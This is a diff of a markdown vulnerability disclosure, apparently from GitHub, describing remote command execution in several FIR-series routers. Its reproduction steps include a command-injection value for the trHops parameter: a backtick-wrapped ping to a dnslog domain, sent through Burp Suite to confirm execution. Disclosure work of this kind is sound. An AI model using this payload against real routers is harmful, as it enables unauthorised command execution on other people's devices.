@@ -9,7 +9,7 @@ The FIR151B A2、FIR302E A2、FIR300B A2 and so on routers has remote command ex
 
 4. Click Start diagnosis
 
-5. Use burpsuite intercept and change trHops argument to 20`ping -c 3 abcdef.r4y19h.dnslog.cn`, forward this request
+5. Use burpsuite intercept and change trHops argument to 20\`ping -c 3 abcdef.r4y19h.dnslog.cn\`, forward this request
 ![image](https://user-images.githubusercontent.com/96364879/182764151-6c698b75-57cf-4419-8bd0-c6064a1fbd57.png)
 
 6. See the dnslog results, The command has been executed successfully
